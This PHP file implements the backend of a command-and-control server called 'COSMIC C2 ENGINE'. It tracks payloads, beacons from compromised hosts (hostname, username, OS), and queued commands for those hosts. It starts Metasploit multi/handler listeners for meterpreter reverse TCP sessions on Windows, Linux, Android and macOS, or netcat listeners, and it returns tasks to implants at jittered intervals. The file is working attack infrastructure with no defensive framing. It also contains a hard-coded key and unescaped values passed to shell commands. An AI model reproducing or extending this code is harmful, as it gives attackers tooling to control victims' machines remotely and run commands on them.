<?php
/**
 * COSMIC C2 ENGINE v5.0 – INDUSTRIAL‑GRADE LISTENERS
 * Supports meterpreter reverse TCP, process management, real-time logs.
 */

class C2Engine {
    private $db;
    private $dbPath;
    private $encryptionKey = 'COSMIC-C2-ENCRYPTION-KEY-2026';
    
    public function __construct() {
        $this->dbPath = dirname(__DIR__, 2) . '/data/c2/c2.db';
        $this->connect();
        $this->migrate();
    }
    
    private function connect() {
        try {
            $this->db = new SQLite3($this->dbPath);
            $this->db->busyTimeout(5000);
            $this->db->exec('PRAGMA foreign_keys = ON;');
        } catch (Exception $e) {
            error_log('C2 Database connection failed: ' . $e->getMessage());
            throw new Exception('C2 Database connection failed.');
        }
    }
    
    private function migrate() {
        // Payloads table
        $this->db->exec("CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uuid TEXT UNIQUE NOT NULL,
            name TEXT,
            type TEXT,
            platform TEXT,
            lhost TEXT,
            lport INTEGER,
            filename TEXT,
            hash_sha256 TEXT,
            created_at INTEGER,
            last_seen INTEGER,
            heartbeat_interval INTEGER DEFAULT 60,
            jitter INTEGER DEFAULT 30,
            encryption_enabled INTEGER DEFAULT 0,
            group_name TEXT DEFAULT '',
            tags TEXT DEFAULT '',
            note TEXT DEFAULT '',
            status TEXT DEFAULT 'active'
        )");
        
        // Beacons table
        $this->db->exec("CREATE TABLE IF NOT EXISTS beacons (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload_uuid TEXT NOT NULL,
            ip TEXT,
            external_ip TEXT DEFAULT '',
            country TEXT DEFAULT '',
            user_agent TEXT,
            hostname TEXT,
            username TEXT,
            os_info TEXT,
            pid INTEGER,
            architecture TEXT,
            beacon_time INTEGER,
            encrypted INTEGER DEFAULT 0
        )");
        
        // Tasks table
        $this->db->exec("CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload_uuid TEXT NOT NULL,
            command TEXT NOT NULL,
            type TEXT DEFAULT 'command',
            status TEXT DEFAULT 'pending',
            created_at INTEGER,
            expires_at INTEGER,
            retries INTEGER DEFAULT 0,
            max_retries INTEGER DEFAULT 3,
            executed_at INTEGER,
            result TEXT
        )");
        
        // Listeners table with new columns
        $this->db->exec("CREATE TABLE IF NOT EXISTS listeners (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            protocol TEXT DEFAULT 'tcp',
            lhost TEXT NOT NULL,
            lport INTEGER NOT NULL,
            payload_type TEXT DEFAULT 'generic/shell_reverse_tcp',
            pid INTEGER,
            status TEXT DEFAULT 'stopped',
            auto_restart INTEGER DEFAULT 0,
            log_file TEXT DEFAULT '',
            last_output TEXT DEFAULT '',
            created_at INTEGER,
            updated_at INTEGER
        )");
        
        // C2 stats table
        $this->db->exec("CREATE TABLE IF NOT EXISTS c2_stats (
            key TEXT PRIMARY KEY,
            value TEXT,
            updated_at INTEGER
        )");
        
        // Initialize stats
        $this->initStat('total_payloads', '0');
        $this->initStat('total_beacons', '0');
        $this->initStat('total_tasks', '0');
    }
    
    private function initStat($key, $default) {
        $stmt = $this->db->prepare("INSERT OR IGNORE INTO c2_stats (key, value, updated_at) VALUES (:key, :val, :time)");
        if (!$stmt) return;
        $stmt->bindValue(':key', $key, SQLITE3_TEXT);
        $stmt->bindValue(':val', $default, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->execute();
    }
    
    // ========== LISTENER MANAGEMENT ==========
    public function createListener($name, $lhost, $lport, $protocol = 'tcp', $payload_type = 'generic/shell_reverse_tcp', $auto_restart = 0) {
        $stmt = $this->db->prepare("
            INSERT INTO listeners (name, lhost, lport, protocol, payload_type, status, auto_restart, created_at, updated_at)
            VALUES (:name, :host, :port, :proto, :ptype, 'stopped', :restart, :time, :time)
        ");
        if (!$stmt) return false;
        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
        $stmt->bindValue(':host', $lhost, SQLITE3_TEXT);
        $stmt->bindValue(':port', $lport, SQLITE3_INTEGER);
        $stmt->bindValue(':proto', $protocol, SQLITE3_TEXT);
        $stmt->bindValue(':ptype', $payload_type, SQLITE3_TEXT);
        $stmt->bindValue(':restart', $auto_restart, SQLITE3_INTEGER);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $result = $stmt->execute();
        if (!$result) return false;
        return $this->db->lastInsertRowID();
    }
    
    public function getListeners() {
        $res = $this->db->query("SELECT * FROM listeners ORDER BY created_at DESC");
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
            $out[] = $row;
        }
        return $out;
    }
    
    public function startListener($id) {
        $stmt = $this->db->prepare("SELECT * FROM listeners WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $listener = $res->fetchArray(SQLITE3_ASSOC);
        if (!$listener) return false;
        
        // Determine command based on payload type
        $cmd = '';
        $logFile = sys_get_temp_dir() . '/c2_listener_' . $id . '.log';
        switch ($listener['payload_type']) {
            case 'windows/meterpreter/reverse_tcp':
            case 'linux/x86/meterpreter/reverse_tcp':
            case 'android/meterpreter/reverse_tcp':
            case 'osx/x64/meterpreter/reverse_tcp':
            case 'generic/shell_reverse_tcp':
                // Use msfconsole with resource script
                $rcFile = sys_get_temp_dir() . '/c2_listener_' . $id . '.rc';
                $rcContent = "use exploit/multi/handler\n";
                $rcContent .= "set PAYLOAD " . $listener['payload_type'] . "\n";
                $rcContent .= "set LHOST " . $listener['lhost'] . "\n";
                $rcContent .= "set LPORT " . $listener['lport'] . "\n";
                $rcContent .= "set ExitOnSession false\n";
                $rcContent .= "exploit -j -z\n";
                file_put_contents($rcFile, $rcContent);
                
                $cmd = "msfconsole -q -r " . escapeshellarg($rcFile) . " > " . escapeshellarg($logFile) . " 2>&1 & echo $!";
                break;
            case 'tcp_raw':
                $cmd = "nc -lvnp " . $listener['lport'] . " > " . escapeshellarg($logFile) . " 2>&1 & echo $!";
                break;
            default:
                return false;
        }
        
        // Execute command and capture PID
        $output = shell_exec($cmd);
        $pid = trim($output);
        if (!is_numeric($pid)) {
            error_log("Failed to start listener: $cmd");
            return false;
        }
        
        // Update listener record
        $stmt = $this->db->prepare("UPDATE listeners SET status = 'running', pid = :pid, log_file = :log, updated_at = :time WHERE id = :id");
        $stmt->bindValue(':pid', $pid, SQLITE3_INTEGER);
        $stmt->bindValue(':log', $logFile, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();
        
        return $pid;
    }
    
    public function stopListener($id) {
        $stmt = $this->db->prepare("SELECT pid FROM listeners WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $listener = $res->fetchArray(SQLITE3_ASSOC);
        if (!$listener || !$listener['pid']) return false;
        
        // Kill process
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            exec("taskkill /PID " . $listener['pid'] . " /F");
        } else {
            exec("kill -9 " . $listener['pid']);
        }
        
        $stmt = $this->db->prepare("UPDATE listeners SET status = 'stopped', pid = NULL, updated_at = :time WHERE id = :id");
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();
        return true;
    }
    
    public function deleteListener($id) {
        $this->stopListener($id);
        $stmt = $this->db->prepare("DELETE FROM listeners WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();
        return true;
    }
    
    public function getListenerLog($id, $lines = 50) {
        $stmt = $this->db->prepare("SELECT log_file FROM listeners WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $listener = $res->fetchArray(SQLITE3_ASSOC);
        if (!$listener || !$listener['log_file'] || !file_exists($listener['log_file'])) {
            return "No log file found.";
        }
        // Return last $lines lines
        $output = shell_exec("tail -n $lines " . escapeshellarg($listener['log_file']));
        return $output ?: "Log is empty.";
    }
    
    // ========== PAYLOAD MANAGEMENT ==========
    public function registerPayload($data) {
        $uuid = $data['uuid'] ?? $this->generateUUID();
        $stmt = $this->db->prepare("
            INSERT INTO payloads 
            (uuid, name, type, platform, lhost, lport, filename, hash_sha256, created_at, status, 
             heartbeat_interval, jitter, encryption_enabled, group_name, tags, note)
            VALUES (:uuid, :name, :type, :platform, :lhost, :lport, :filename, :hash, :created, :status,
                    :heartbeat, :jitter, :encrypt, :group, :tags, :note)
        ");
        if (!$stmt) return false;
        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
        $stmt->bindValue(':name', $data['name'] ?? 'Unnamed', SQLITE3_TEXT);
        $stmt->bindValue(':type', $data['type'] ?? 'unknown', SQLITE3_TEXT);
        $stmt->bindValue(':platform', $data['platform'] ?? 'generic', SQLITE3_TEXT);
        $stmt->bindValue(':lhost', $data['lhost'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':lport', $data['lport'] ?? 0, SQLITE3_INTEGER);
        $stmt->bindValue(':filename', $data['filename'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':hash', $data['hash'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':created', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':status', $data['status'] ?? 'active', SQLITE3_TEXT);
        $stmt->bindValue(':heartbeat', $data['heartbeat'] ?? 60, SQLITE3_INTEGER);
        $stmt->bindValue(':jitter', $data['jitter'] ?? 30, SQLITE3_INTEGER);
        $stmt->bindValue(':encrypt', $data['encryption_enabled'] ?? 0, SQLITE3_INTEGER);
        $stmt->bindValue(':group', $data['group'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':tags', $data['tags'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':note', $data['note'] ?? '', SQLITE3_TEXT);
        $stmt->execute();
        $this->updateStat('total_payloads', '+1');
        return $uuid;
    }
    
    public function getPayloads($filters = []) {
        $sql = "SELECT * FROM payloads";
        $where = [];
        $params = [];
        foreach ($filters as $k => $v) {
            $where[] = "$k = :$k";
            $params[":$k"] = $v;
        }
        if (!empty($where)) $sql .= " WHERE " . implode(' AND ', $where);
        $sql .= " ORDER BY created_at DESC";
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return [];
        foreach ($params as $key => $val) {
            $stmt->bindValue($key, $val, SQLITE3_TEXT);
        }
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
            $out[] = $row;
        }
        return $out;
    }
    
    public function getActivePayloads() {
        return $this->getPayloads(['status' => 'active']);
    }
    
    public function getPayload($uuid) {
        $stmt = $this->db->prepare("SELECT * FROM payloads WHERE uuid = :uuid");
        if (!$stmt) return null;
        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_ASSOC);
    }
    
    // ========== BEACON MANAGEMENT ==========
    public function beacon($payloadUuid, $info) {
        $payload = $this->getPayload($payloadUuid);
        if (!$payload || $payload['status'] !== 'active') {
            return ['error' => 'Payload not active'];
        }
        
        $stmt = $this->db->prepare("UPDATE payloads SET last_seen = :time WHERE uuid = :uuid");
        if (!$stmt) return [];
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->execute();
        
        $encrypted = isset($info['encrypted']) ? (int)$info['encrypted'] : 0;
        
        $stmt = $this->db->prepare("
            INSERT INTO beacons 
            (payload_uuid, ip, external_ip, country, user_agent, hostname, username, os_info, pid, architecture, beacon_time, encrypted)
            VALUES (:uuid, :ip, :ext_ip, :country, :ua, :hostname, :username, :os, :pid, :arch, :time, :enc)
        ");
        if (!$stmt) return [];
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':ip', $info['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':ext_ip', $info['external_ip'] ?? $this->getExternalIP(), SQLITE3_TEXT);
        $stmt->bindValue(':country', $info['country'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':ua', $info['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':hostname', $info['hostname'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':username', $info['username'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':os', $info['os_info'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':pid', $info['pid'] ?? 0, SQLITE3_INTEGER);
        $stmt->bindValue(':arch', $info['architecture'] ?? '', SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':enc', $encrypted, SQLITE3_INTEGER);
        $stmt->execute();
        
        $this->updateStat('total_beacons', '+1');
        $tasks = $this->getPendingTasks($payloadUuid);
        
        $interval = $payload['heartbeat_interval'] + rand(-$payload['jitter'], $payload['jitter']);
        if ($interval < 10) $interval = 10;
        
        return [
            'status' => 'ok',
            'tasks' => $tasks,
            'next_interval' => $interval,
            'server_time' => time()
        ];
    }
    
    public function getBeacons($payloadUuid = null, $limit = 50) {
        $sql = "SELECT * FROM beacons";
        $params = [];
        if ($payloadUuid) {
            $sql .= " WHERE payload_uuid = :uuid";
            $params[':uuid'] = $payloadUuid;
        }
        $sql .= " ORDER BY beacon_time DESC LIMIT :limit";
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return [];
        if ($payloadUuid) $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':limit', $limit, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
            $out[] = $row;
        }
        return $out;
    }
    
    // ========== TASK MANAGEMENT ==========
    public function addTask($payloadUuid, $command, $type = 'command', $expiresIn = 3600) {
        $stmt = $this->db->prepare("
            INSERT INTO tasks (payload_uuid, command, type, status, created_at, expires_at)
            VALUES (:uuid, :cmd, :type, 'pending', :time, :expires)
        ");
        if (!$stmt) return false;
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':cmd', $command, SQLITE3_TEXT);
        $stmt->bindValue(':type', $type, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':expires', time() + $expiresIn, SQLITE3_INTEGER);
        $stmt->execute();
        $taskId = $this->db->lastInsertRowID();
        $this->updateStat('total_tasks', '+1');
        return $taskId;
    }
    
    public function getPendingTasks($payloadUuid) {
        $stmt = $this->db->prepare("
            SELECT id, command, type FROM tasks 
            WHERE payload_uuid = :uuid 
              AND status = 'pending'
              AND (expires_at IS NULL OR expires_at > :now)
            ORDER BY created_at ASC
        ");
        if (!$stmt) return [];
        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
        $stmt->bindValue(':now', time(), SQLITE3_INTEGER);
        $res = $stmt->execute();
        $tasks = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
            $tasks[] = $row;
        }
        return $tasks;
    }
    
    public function completeTask($taskId, $result) {
        $stmt = $this->db->prepare("
            UPDATE tasks SET status = 'completed', executed_at = :exec, result = :result
            WHERE id = :id
        ");
        if (!$stmt) return;
        $stmt->bindValue(':exec', time(), SQLITE3_INTEGER);
        $stmt->bindValue(':result', $result, SQLITE3_TEXT);
        $stmt->bindValue(':id', $taskId, SQLITE3_INTEGER);
        $stmt->execute();
    }
    
    public function getTasks($payloadUuid = null, $status = null) {
        $sql = "SELECT * FROM tasks";
        $where = [];
        $params = [];
        if ($payloadUuid) {
            $where[] = "payload_uuid = :uuid";
            $params[':uuid'] = $payloadUuid;
        }
        if ($status) {
            $where[] = "status = :status";
            $params[':status'] = $status;
        }
        if (!empty($where)) $sql .= " WHERE " . implode(' AND ', $where);
        $sql .= " ORDER BY created_at DESC";
        $stmt = $this->db->prepare($sql);
        if (!$stmt) return [];
        foreach ($params as $key => $val) {
            $stmt->bindValue($key, $val, SQLITE3_TEXT);
        }
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
            $out[] = $row;
        }
        return $out;
    }
    
    public function deleteTask($taskId) {
        $stmt = $this->db->prepare("DELETE FROM tasks WHERE id = :id");
        if (!$stmt) return;
        $stmt->bindValue(':id', $taskId, SQLITE3_INTEGER);
        $stmt->execute();
        $this->updateStat('total_tasks', '-1');
    }
    
    // ========== STATISTICS ==========
    public function getStats() {
        $stats = [];
        $res = $this->db->query("SELECT * FROM c2_stats");
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
            $stats[$row['key']] = $row['value'];
        }
        $stats['payloads_active'] = $this->db->querySingle("SELECT COUNT(*) FROM payloads WHERE status='active'");
        $stats['payloads_total'] = $this->db->querySingle("SELECT COUNT(*) FROM payloads");
        $stats['beacons_today'] = $this->db->querySingle("SELECT COUNT(*) FROM beacons WHERE beacon_time > " . (time() - 86400));
        $stats['tasks_pending'] = $this->db->querySingle("SELECT COUNT(*) FROM tasks WHERE status='pending' AND (expires_at IS NULL OR expires_at > " . time() . ")");
        $stats['tasks_completed'] = $this->db->querySingle("SELECT COUNT(*) FROM tasks WHERE status='completed'");
        return $stats;
    }
    
    private function updateStat($key, $delta) {
        $stmt = $this->db->prepare("
            INSERT INTO c2_stats (key, value, updated_at)
            VALUES (:key, :val, :time)
            ON CONFLICT(key) DO UPDATE SET 
                value = CASE 
                    WHEN :val LIKE '+%' THEN CAST(value AS INTEGER) + CAST(SUBSTR(:val,2) AS INTEGER)
                    WHEN :val LIKE '-%' THEN CAST(value AS INTEGER) - CAST(SUBSTR(:val,2) AS INTEGER)
                    ELSE :val
                END,
                updated_at = :time
        ");
        if (!$stmt) return;
        $stmt->bindValue(':key', $key, SQLITE3_TEXT);
        $stmt->bindValue(':val', $delta, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        $stmt->execute();
    }
    
    // ========== UTILITY ==========
    private function generateUUID() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }
    
    private function getExternalIP() {
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}
